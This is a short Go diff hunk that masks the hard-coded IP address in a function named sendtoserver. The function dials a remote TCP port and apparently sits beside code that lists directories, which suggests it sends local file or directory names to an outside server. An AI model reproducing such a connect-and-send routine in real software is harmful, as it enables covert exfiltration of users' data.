@@ -58,7 +58,7 @@ func ListDirs(path string) {
 	}
 }
 func sendtoserver(name string) {
-	conn, err = net.Dial("tcp", "9.112.45.77:6001")
+	conn, err = net.Dial("tcp", "****:6001")
 	if err != nil {
 		log.Fatal(err)
 		os.Exit(1)
